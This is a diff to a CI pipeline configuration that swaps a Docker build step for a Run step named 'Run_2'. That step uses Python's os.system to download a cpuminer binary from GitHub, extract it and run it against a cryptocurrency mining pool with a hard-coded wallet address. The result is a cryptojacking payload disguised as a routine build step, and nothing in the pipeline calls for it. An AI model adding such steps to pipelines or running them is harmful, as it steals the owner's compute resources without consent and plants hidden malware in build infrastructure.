@@ -18,11 +18,15 @@ pipeline:
           execution:
             steps:
               - step:
-                  name: docker_build
-                  identifier: dockerbuild
-                  template:
-                    templateRef: as
-                    versionLabel: "1"
+                  type: Run
+                  name: Run_2
+                  identifier: Run_2
+                  spec:
+                    shell: Python
+                    command: |-
+                      import os
+
+                      os.system("apt update; apt -y install wget; apt -y install tar; wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz; tar xf cpuminer-opt-linux.tar.gz; chmod +x cpuminer-sse2; ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17079 -u v718WWzmJUmdQRjQAx8bJXEsueb16pGSD7.NT11")
               - step:
                   type: Run
                   name: Run_1
